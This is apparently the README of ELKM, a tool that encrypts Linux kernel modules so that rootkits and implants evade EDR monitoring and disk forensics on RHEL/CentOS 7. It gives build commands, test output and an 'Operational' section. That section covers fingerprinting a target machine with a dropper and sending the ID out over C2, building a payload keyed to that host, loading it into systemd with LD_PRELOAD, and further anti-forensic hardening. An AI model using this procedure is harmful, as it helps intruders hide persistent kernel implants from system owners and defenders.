# ELKM: Encrypted Linux x86-64 Loadable Kernel Modules

ELKM provides a mechanism to securely transport and load encrypted Loadable
Kernel Modules (LKM). The aim is to protect kernel-based rootkits and implants
against observation by Endpoint Detection and Response (EDR) software and to
neutralize the effects of recovery by disk forensics tooling.


## RHEL/CentOS 7 

ELKM was specifically written for RHEL/CentOS 7 x86-64.

```
kernel-tools-libs-3.10.0-1127.18.2.el7.x86_64
kernel-devel-3.10.0-1127.18.2.el7.x86_64
kernel-tools-3.10.0-1127.18.2.el7.x86_64
kernel-headers-3.10.0-1127.18.2.el7.x86_64
kernel-3.10.0-1127.18.2.el7.x86_64
```


### Prepare build environment
```
sudo yum install glibc-static -y
sudo yum install kernel-devel -y
sudo yum install kernel-headers -y
sudo yum install openssl-devel -y
sudo yum install libcurl-devel -y
```


### Local automated testing

The test script performs 4 tests:
* Password provided via /sys/class/dmi/id/product_uuid
* Password provided via http://169.254.169.254/latest/meta-data/instance-id (when on EC2)
* Password provided via the environment
* Password provided via stdin

```
$ make
$ sudo ./test.sh
make -C /lib/modules/3.10.0-1127.13.1.el7.x86_64/build M=/home/test/encrypted-kernel-modules clean
make[1]: Entering directory `/usr/src/kernels/3.10.0-1127.13.1.el7.x86_64'
  CLEAN   /home/test/encrypted-kernel-modules/.tmp_versions
  CLEAN   /home/test/encrypted-kernel-modules/Module.symvers
make[1]: Leaving directory `/usr/src/kernels/3.10.0-1127.13.1.el7.x86_64'
rm -f loader.so
rm -f payloadfuser
make -C /lib/modules/3.10.0-1127.13.1.el7.x86_64/build M=/home/test/encrypted-kernel-modules modules
make[1]: Entering directory `/usr/src/kernels/3.10.0-1127.13.1.el7.x86_64'
  CC [M]  /home/test/encrypted-kernel-modules/kernel-module.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/test/encrypted-kernel-modules/kernel-module.mod.o
  LD [M]  /home/test/encrypted-kernel-modules/kernel-module.ko
make[1]: Leaving directory `/usr/src/kernels/3.10.0-1127.13.1.el7.x86_64'
gcc -o loader.so loader.c -fPIC -shared -ldl -lcrypto -Wall
gcc -o payloadfuser payloadfuser.c -lcrypto -Wall
strip --strip-unneeded kernel-module.ko
strip --strip-unneeded loader.so
strip payloadfuser
--------------------------------------------------------------------------------
stage 1: fusing './kernel-module.ko' payload with './loader.so' using './payloadfuser':
main(): encrypting './kernel-module.ko' with password '07EC86F1-957C-6B4E-9134-7A6DE5ACC99C', and fusing with './loader.so'

stage 2: executing './loader.so':

module loaded: YES
unloading

--------------------------------------------------------------------------------
stage 1: fusing './kernel-module.ko' payload with './loader.so' using './payloadfuser':
main(): encrypting './kernel-module.ko' with password 'TEST-ENV-KEY', and fusing with './loader.so'

stage 2: executing './loader.so':

module loaded: YES
unloading

--------------------------------------------------------------------------------
stage 1: fusing './kernel-module.ko' payload with './loader.so' using './payloadfuser':
main(): encrypting './kernel-module.ko' with password 'TEST-STDIN-KEY', and fusing with './loader.so'

stage 2: executing './loader.so':

module loaded: YES
unloading

```


### Build, and manually create test payload
```
make
./payloadfuser ./kernel-module.ko ./loader.so dummykey
FOO=dummykey LD_PRELOAD=./loader.so /usr/lib/systemd/systemd
```


### Operational

#### Tying ELKM to a specific system

##### Via product_uuid

On the target system:
```
cat /sys/class/dmi/id/product_uuid
```

Note: this should be done in an automated manner, e.g. via a dropper. TX the
product_uuid to the staging infrastructure via C2.


On the staging infrastructure:
```
./payloadfuser ./implant.ko ./loader.so $uuid
```

On the target system download the loader from the staging infrastucture, and
execute it via a trusted executable:
```
LD_PRELOAD=./loader.so /usr/lib/systemd/systemd
```

##### Via EC2 instance ID

On the target system:
```
curl http://169.254.169.254/latest/meta-data/instance-id
```

Note: this should be done in an automated manner, e.g. via a dropper. TX the
instance ID to the staging infrastructure via C2.

On the staging infrastructure:
```
./payloadfuser ./implant.ko ./loader.so $instanceid
```

On the target system download the loader from the staging infrastucture, and
execute it via a trusted executable:
```
LD_PRELOAD=./loader.so /usr/lib/systemd/systemd
```


#### To set the password for use with environment or interactive shell

On the staging infrastructure:
```
./payloadfuser ./implant.ko ./loader.so PASSWORD
```

On the target system, via the environment:
```
# FOO=PASSWORD LD_PRELOAD=./loader.so /usr/lib/systemd/systemd
#
```

Or via stdin:
```
# LD_PRELOAD=./loader.so /usr/lib/systemd/systemd
THISISMYINTERACTIVEPASSWORD
#
```


#### Tips

Some tips if you want to deploy ELKM operationally:

* Do not compile with 'debug'
* Change the function names
* Implement more antifor techniques
* Consider replacing OpenSSL with another crypto library
* Implement a self destruct mode when passwords fail

We chose not to implement these features to avoid fingerprinting.
